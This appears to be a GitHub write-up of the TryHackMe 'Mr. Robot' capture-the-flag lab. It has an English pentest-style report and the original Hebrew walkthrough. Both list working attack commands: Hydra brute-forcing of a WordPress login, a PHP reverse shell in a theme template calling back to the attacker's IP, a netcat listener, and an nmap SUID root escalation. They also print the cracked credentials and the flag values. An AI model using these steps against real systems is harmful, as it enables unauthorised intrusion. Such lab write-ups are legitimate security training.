# THM-Mr.Robot



<img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/803fbedc-3e53-4f1e-8fff-c227739a4619" />


This is a comprehensive breakdown of your **Mr. Robot CTF** walkthrough, formatted as a professional **Penetration Testing Report**. I have translated and adapted your findings into the required professional English structure, focusing on executive impact, technical depth, and remediation.

---

# Penetration Test Report: Mr. Robot CTF
**Target IP:** 10.114.168.48 / 10.112.177.29  
**Date:** April 4, 2026  
**Author:** [Your Name]  
**Status:** Final Report

---

## 1. Executive Summary
This report details a full-stack security assessment of the "Mr. Robot" server. The evaluation revealed critical vulnerabilities ranging from sensitive information disclosure to broken authentication and insecure system configurations. 

The primary security failure stemmed from an outdated WordPress installation with weak administrative credentials, allowing for **Remote Code Execution (RCE)**. Furthermore, a misconfigured system binary with **SUID permissions** allowed an attacker to escalate privileges from a low-level service account to full **ROOT (Administrative)** control. 

**Risk Level: CRITICAL.** An external attacker could fully compromise the server, exfiltrate all data, and use the infrastructure for further malicious activities. Immediate patching and credential rotation are required.

---

## 2. Vulnerability Table

| ID | Severity | Vulnerability Name | Status |
|:---|:---|:---|:---|
| 01 | Medium | Sensitive Information Disclosure (robots.txt) | Open |
| 02 | High | Broken Authentication (WordPress Brute Force) | Open |
| 03 | Critical | Remote Code Execution (via Theme Editor) | Open |
| 04 | Critical | Privilege Escalation (Insecure SUID Binary) | Open |

---

## 3. Technical Deep Dive

### 3.1 Information Disclosure & Enumeration
**Description:** The application's `robots.txt` file contained entries pointing to sensitive files not intended for public access, including a custom dictionary file.

**Impact:** Attackers can gather specific intelligence about the system environment and obtain wordlists tailored for brute-force attacks.

**Proof of Concept (PoC):**
Accessing `http://<TARGET_IP>/robots.txt` revealed:
```text
User-agent: *
fsocity.dic
key-1-of-3.txt
```
The dictionary `fsocity.dic` was downloaded and optimized for a brute-force attack:
```bash
# Removing duplicate entries to increase attack efficiency
sort fsocity.dic | uniq > fs-list.txt
wc -w fs-list.txt
# Output: 11451 unique words
```



---

### 3.2 Broken Authentication (WordPress)
**Description:** The WordPress login interface (`/wp-login.php`) did not implement rate limiting or account lockout, making it susceptible to automated brute-force attacks.

**Impact:** Unauthorized access to the WordPress Dashboard, allowing attackers to modify site content and underlying code.

**Proof of Concept (PoC):**
Using **Hydra** to identify the username and subsequently the password:
```bash
# Step 1: Username Enumeration
hydra -L fs-list -p test <TARGET_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username"

# Result: User "elliot" identified.

# Step 2: Password Cracking
hydra -l elliot -P fs-list <TARGET_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered"

# Result: Credentials found -> elliot:ER28-0652
```

---

### 3.3 Remote Code Execution (Initial Access)
**Description:** The administrative "Theme Editor" allowed the modification of PHP files. By injecting a malicious payload into the `404.php` template, a Reverse Shell was triggered.

**Impact:** Direct command execution on the server under the `daemon` service account.

**Proof of Concept (PoC):**
1. Navigated to **Appearance > Editor > 404.php**.
2. Replaced the code with a PHP Reverse Shell payload pointing to the attacker's IP (`192.168.203.195`) on port `4444`.
3. Established a listener on the attacker machine:
```bash
nc -lvnp 4444
```
4. Triggered the shell by browsing to: `http://<TARGET_IP>/wp-content/themes/twentyfifteen/404.php`.
5. Upgraded to an interactive TTY:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

### 3.4 Privilege Escalation (SUID Nmap)
**Description:** The `nmap` binary was found with the SUID bit set, owned by **root**. This specific version of Nmap includes an "interactive mode" that allows users to execute shell commands with the file owner's privileges.

**Impact:** Complete system takeover. Any user can escalate themselves to **root**.

**Proof of Concept (PoC):**
Identification of SUID binaries:
```bash
find / -perm -u=s -type f 2>/dev/null
# Found: /usr/local/bin/nmap
```


Exploitation via **GTFOBins** method:
```bash
# Entering Nmap interactive mode
nmap --interactive

# Executing a root shell from within Nmap
nmap> !sh

# Verification
id
# Output: uid=0(root) gid=0(root)
```
Final flags were exfiltrated:
* **Key 2:** `822c73956184f694993bede3eb39f959`
* **Key 3:** `04787ddef27c3dee1ee161b21670b4e4`

---

## 4. Remediation Plan

1. **Information Disclosure:** Remove sensitive filenames from `robots.txt` and move administrative files to non-predictable directories.
2. **WordPress Security:** * Update WordPress core and all plugins to the latest versions.
    * Implement **Multi-Factor Authentication (MFA)** for all users.
    * Install a Web Application Firewall (WAF) or plugin (e.g., Wordfence) to limit login attempts.
3. **Insecure Configurations:** * Conduct an audit of all SUID/SGID files. Remove the SUID bit from binaries like `nmap` that do not require it for standard users (`chmod u-s /usr/local/bin/nmap`).
    * Disable the "Theme Editor" and "Plugin Editor" in WordPress by adding `define( 'DISALLOW_FILE_EDIT', true );` to `wp-config.php`.
4. **Credential Management:** Change all passwords for system users and WordPress administrators immediately.

---

**End of Report.**



שלב 1: איסוף מידע וסריקת רשת (Reconnaissance)
1.1 סריקת פורטים (Nmap)
השלב הראשון בתהליך היה זיהוי שירותים פעילים על גבי שרת היעד. ביצעתי סריקת nmap הכוללת זיהוי גרסאות שירותים (-sV) והרצת סקריפטים ברירת מחדל (-sC) כדי למפות את שטח התקיפה.

Bash
# הרצת סריקת nmap ראשונית
nmap -sV -sC -oA scans/initial 10.114.168.48

<img width="921" height="463" alt="image" src="https://github.com/user-attachments/assets/7f587d16-1d83-4670-9b10-36d51400d1cf" />

ממצאי הסריקה:
הסריקה העלתה שלושה פורטים פתוחים:

Port 22 (SSH): פתוח (גרסה OpenSSH 8.2p1).

Port 80 (HTTP): פתוח (שרת Apache).

Port 443 (HTTPS): פתוח (שרת Apache עם תמיכת SSL).

1.2 בחינת ממשק האינטרנט
בגישה לכתובת ה-IP של היעד דרך הדפדפן (http://10.114.168.48), מוצג טרמינל אינטראקטיבי המעוצב ברוח הסדרה "Mr. Robot". למרות שהממשק מרשים ויזואלית, הוא אינו מכיל פגיעות ישירה בשכבה הגלויה.

המשך התהליך יתמקד בביצוע Enumeration (מנייה) לספריות וקבצים חבויים בשרת כדי למצוא נקודת כניסה למערכת.

שלב 2: מעבר מסריקת רשת לסריקת אפליקציה (Web Enumeration)
הלוגיקה מאחורי השלב:
לאחר שסריקת ה-nmap זיהתה שפורט 80 (HTTP) פתוח, נקודת ההנחה היא שקיים שרת אינטרנט פעיל המשמש כווקטור תקיפה פוטנציאלי. בשלב זה, המטרה היא "לחשוף" קבצים או ספריות שאינם גלויים לעין בתפריטי האתר הרגילים.

זיהוי קבצי הגדרות (robots.txt):
כחלק מנוהל עבודה סטנדרטי (Best Practice), בדקתי את קובץ ה-robots.txt. קובץ זה נועד להנחות סורקי אינטרנט (כמו Googlebot) לאילו נתיבים לא להיכנס, ולכן הוא מהווה מקור מידע רגיש עבור האקרים, שכן הוא חושף לעיתים קרובות נתיבי ניהול או קבצי גיבוי.

ביצוע הפעולה:
ניגשתי לכתובת: http://10.114.168.48/robots.txt

<img width="1102" height="500" alt="image" src="https://github.com/user-attachments/assets/27359a4f-f02f-421c-a58a-4c74d7533965" />




2.3 השגת הדגל הראשון (Key 1 of 3)
לאחר שזיהיתי את הנתיב בקובץ ה-robots.txt, ניגשתי ישירות לקובץ הטקסט בדפדפן.

כתובת המקור:
http://10.114.168.48/key-1-of-3.txt

התוצאה:
הקובץ הכיל את המחרוזת הבאה (הדגל הראשון):
073403c9325489496e282b130f14652c
<img width="895" height="298" alt="image" src="https://github.com/user-attachments/assets/ef9bb2ba-e2f8-494f-8dc7-c426adef736d" />

<img width="1505" height="582" alt="image" src="https://github.com/user-attachments/assets/79e89750-9568-4173-b60f-ae6bf0b6199e"
  
  
  
  
  />


שלב 3: הורדת מילון המילים(fsocity.dic)
לאחר שזיהיתי את קובץ המילון ב-robots.txt, ניגשתי אליו כדי להוריד אותו. קובץ זה מכיל רשימת מילים המותאמת אישית לשרת זה, והוא ישמש אותי בשלבים הבאים לביצוע מתקפות Brute Force.

פעולה:
גישה לכתובת: http://10.114.174.154/fsocity.dic



<img width="1219" height="899" alt="image" src="https://github.com/user-attachments/assets/5152522f-7880-4ca6-9df0-f05f91b48bbe" />





<img width="599" height="498" alt="image" src="https://github.com/user-attachments/assets/a5a27ab8-044c-449c-9e2f-0e11cf51bca0" />

שלב 4: אופטימיזציה של רשימת המילים (Deduplication)
קובץ המילון שנמצא (fsocity.dic) הכיל כמות מאסיבית של מילים כפולות שהיו מעכבות את ניסיון הפריצה. ביצעתי תהליך סינון כדי להשאיר רק מילים ייחודיות.

הפקודות לביצוע:

Bash
sort fsocity.dic | uniq > fs-list.txt
אימות התוצאה:
באמצעות הפקודה wc -w, וידאתי שרשימת המילים צומצמה למספר יעיל של מילים ייחודיות.

Bash
wc -w fs-list.txt
# Output: 11451
<img width="1121" height="224" alt="image" src="https://github.com/user-attachments/assets/7491244d-bf7d-4e54-82d6-6e6350db4c42" />



שלב 5: סריקת ספריות (Directory Brute-Forcing)
כדי לחשוף נתיבים חבויים בשרת האינטרנט, השתמשתי בכלי gobuster. הסריקה נועדה למצוא דפי ניהול או ממשקי התחברות.

פקודה:

Bash
gobuster dir -u http://10.114.174.154/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
ממצאים בולטים:
הסריקה העלתה מספר נתיבים קריטיים המצביעים על כך שהאתר מריץ WordPress:

/wp-login.php (דף התחברות)

/wp-admin/ (פאנל ניהול)

/license





/readme
<img width="1587" height="834" alt="image" src="https://github.com/user-attachments/assets/c11c7cd5-ce27-46e1-811f-e9d78c3325cc" />


שלב 6: פריצה למערכת הניהול (Authentication Brute Force)
לאחר שזיהיתי שהאתר מריץ WordPress והנתיב /wp-login.php נגיש, עברתי לניסיון השגת גישה באמצעות הכלי Hydra. התקיפה התחלקה לשני שלבים:

8.1 זיהוי שם משתמש (Username Enumeration)
מכיוון ש-WordPress מחזירה הודעות שגיאה שונות עבור שם משתמש שגוי לעומת סיסמה שגויה, ניתן להשתמש בזה כדי למצוא שם משתמש תקף. השתמשתי במילון המילים שנוקה קודם לכן (fs-list) כדי לסרוק שמות משתמש פוטנציאליים.

הפקודה לזיהוי המשתמש:

Bash
hydra -L fs-list -p test 10.112.177.29 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" -t 30

ממצא: שם המשתמש שזוהה במערכת הוא elliot.


<img width="1693" height="225" alt="image" src="https://github.com/user-attachments/assets/44f03dc9-bd43-4f65-900a-093799a995dd" />
8.2 פיצוח הסיסמה (Password Brute Force)
לאחר אימות שם המשתמש, הרצתי מתקפת Brute Force ממוקדת על הסיסמה של המשתמש elliot באמצעות המילון המזוקק.





הפקודה לפיצוח הסיסמה:

Bash
hydra -l elliot -P fs-list 10.112.177.29 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered" -t 64

תוצאה: הסיסמה נמצאה בהצלחה ER28-0652




<img width="1665" height="190" alt="image" src="https://github.com/user-attachments/assets/ca5c9d76-33c8-4cab-8184-f7b627d7016d" />




<img width="1632" height="879" alt="image" src="https://github.com/user-attachments/assets/ebceb381-6d39-486a-ac47-18fcd4e9ad34" />




<img width="1647" height="876" alt="image" src="https://github.com/user-attachments/assets/fb6dda89-16a4-473f-a1cd-7eafaed85694" />



שלב 10: כניסה לממשק הניהול והכנת ה-Reverse Shell
לאחר פיצוח הסיסמה בהצלחה, התחברתי למערכת הניהול של האתר. הגישה לפאנל הניהול מאפשרת למנהל המערכת לערוך קבצי קוד ישירות מהדפדפן, תכונה אותה ננצל להרצת קוד עוין.

1. אימות גישה ל-Dashboard:
כפי שניתן לראות בצילום המסך, התחברתי בהצלחה כמשתמש elliot. המערכת מזהה גרסת WordPress ישנה (4.3.1), מה שמעיד על פוטנציאל גבוה לחולשות נוספות.

<img width="749" height="477" alt="image" src="https://github.com/user-attachments/assets/d0cd68fa-a34f-4cb5-873d-d3a126d704e6" />



2. עריכת תבנית האתר (Theme Editor):
ניווטתי לתפריט Appearance ולאחר מכן ל-Editor. בחרתי לערוך את תבנית ה-404 Template (404.php) של ערכת הנושא "Twenty Fifteen".

הלוגיקה:
דף ה-404 הוא קובץ PHP שנטען בכל פעם שמשתמש ניגש לנתיב שלא קיים בשרת. על ידי החלפת הקוד המקורי ב-PHP Reverse Shell, אוכל להפעיל את הקוד שלי פשוט על ידי גלישה לכתובת אקראית באתר.

<img width="1716" height="841" alt="image" src="https://github.com/user-attachments/assets/279379b3-1310-45a0-b335-e171a98fe2cf" />








שלב 11: יצירת ה-Payload באמצעות Reverse Shell Generator
כדי להבטיח שהקוד יפעל בצורה תקינה ויחזור לכתובת הנכונה, השתמשתי באתר revshells.com. כלי זה מאפשר יצירת סקריפטים מוכנים מראש (Payloads) עבור מגוון רחב של שפות תכנות ומערכות הפעלה.

הגדרות שנבחרו (כפי שמוצג בצילום המסך):


<img width="1581" height="896" alt="image" src="https://github.com/user-attachments/assets/9c5408b4-9311-410a-9fa6-a5ee1e0c23c5" />


ביצוע:
העתקתי את הקוד שנוצר בחלון ה-Preview  כדי להדביק אותו בתוך עורך התבניות -WordPress.






שלב 12: פתרון בעיות והשגת גישה ראשונית (Initial Access)
במהלך הניסיונות להריץ את ה-Reverse Shell, נתקלתי במספר מכשולים טכניים שדרשו אבחון וטיפול לפני קבלת הגישה לשרת.

1. האתגרים והפתרונות (Troubleshooting):
בעיית נתיב הקובץ: בתחילה, הקוד הוזרק לקובץ העיצוב (style.css), שאינו מורץ על ידי השרת. הפתרון היה זיהוי התבנית הפעילה (Twenty Fifteen) והזרקת הקוד לקובץ ה-404.php (Template), שמאפשר הרצת קוד PHP בצד השרת.

שגיאת הגדרת IP (LHOST): הקוד המקורי הכיל את כתובת ה-IP של היעד במקום את כתובת המכונה התוקפת. עדכנתי את ה-Payload לכתובת ה-VPN המדויקת שלי (192.168.203.195).

חסימת פורטים: הפורט הראשוני (1234) לא הגיב, לכן העברתי את ה-Payload ואת המאזין (Listener) לפורט 4444 המקובל יותר.

2. הפריצה וקבלת ה-Shell:
לאחר תיקון הפרמטרים, הרצתי מאזין באמצעות Netcat וניגשתי בדפדפן לנתיב הישיר של הקובץ:
http://10.112.177.29/wp-content/themes/twentyfifteen/404.php

<img width="1055" height="547" alt="image" src="https://github.com/user-attachments/assets/6ef0aa95-8ac0-4f60-9b5a-1d52bb421887" />



<img width="1198" height="231" alt="image" src="https://github.com/user-attachments/assets/ac67327b-2c12-4966-8e67-264ab2a34bb6" />


התוצאה:
החיבור בוצע בהצלחה וקיבלתי גישת טרמינל (Interactive Shell) כמשתמש המערכת daemon.



שלב 15: שדרוג ה-Shell (Interactive Shell Upgrade)
לאחר קבלת הגישה הראשונית, ה-Shell שהתקבל היה מוגבל מאוד (Non-Interactive). כדי לאפשר עבודה נוחה יותר, הרצת פקודות מורכבות ושימוש בקיצורי מקלדת, ביצעתי שדרוג ל-TTY Shell באמצעות Python.

הפעולה שבוצעה:
השתמשתי במודול ה-pty של Python כדי להריץ תהליך Bash חדש בסביבת הטרמינל הקיימת.

הפקודה להרצה:

Bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
התוצאה:
הטרמינל השתנה מ-$ פשוט לשורה המציגה את שם המשתמש והמכונה (daemon@ip-10-112-177-29:/$). פעולה זו מאפשרת לי כעת לנווט במערכת הקבצים בצורה יעילה הרבה יותר.



<img width="1089" height="214" alt="image" src="https://github.com/user-attachments/assets/c9896f18-42e7-4b26-8b43-efde7a329992" />



<img width="1018" height="454" alt="image" src="https://github.com/user-attachments/assets/37f078db-a506-4fd0-b708-8ff5bb2b2b9d" />



שלב 16: העלאת הרשאות (Privilege Escalation) והשלמת המכונה
לאחר השגת גישה ראשונית כמשתמש daemon, המטרה הייתה להעלות הרשאות למשתמש העל (Root) כדי להשיג שליטה מלאה בשרת ולחלץ את ה-Flags הנותרים.

1. זיהוי וקטור התקיפה (SUID Enumeration)
חיפשתי קבצים במערכת שמוגדרים עם הרשאת SUID (קבצים שרצים בהרשאות של בעל הקובץ – במקרה זה Root).
הפקודה שבוצעה:

הממצא: הקובץ /usr/local/bin/nmap זוהה כבעל הרשאת SUID. בגרסאות ישנות של Nmap, ניתן לנצל את "המצב האינטראקטיבי" כדי להריץ פקודות מערכת כ-Root.

2. ניצול ה-SUID ופריצה ל-Root
השתמשתי בטכניקת GTFOBins כדי לפתוח Shell עם הרשאות מנהל מתוך Nmap.

הפקודות שבוצעו:

כניסה למצב אינטראקטיבי:

קריאה ל-Shell מתוך היישום:

תוצאה: כפי שניתן לראות בצילום המסך, שורת הפקודה השתנתה ל-root@ip-10-112-177-29:/#, מה שמעיד על הצלחת הפריצה.

3. חילוץ ה-Flags הסופיים (Flag Capture)
עם הרשאות ה-Root, ניגשתי לקרוא את הקבצים המוגנים:

Flag 2 (מתיקיית הבית של robot):

ערך ה-Flag: 822c73956184f694993bede3eb39f959

Flag 3 (מתיקיית ה-Root):

ערך ה-Flag: 04787ddef27c3dee1ee161b21670b4e4

סיכום הפרויקט (Conclusion)
במכונת ה-Mr. Robot, ביצעתי תהליך שלם של בדיקת חדירה (Penetration Test):

Reconnaissance: סריקת שירותים וזיהוי קבצי מפתח (robots.txt).

Web Exploitation: פיצוח סיסמאות ל-WordPress (Brute Force) והזרקת Reverse Shell.

Privilege Escalation: ניצול הגדרות SUID שגויות בתוכנת Nmap להשגת הרשאות Root.

<img width="1175" height="741" alt="image" src="https://github.com/user-attachments/assets/02b83587-3b14-4546-a9ce-8a5efc8e3385" />


המכונה הושלמה ב-100%! 🚀

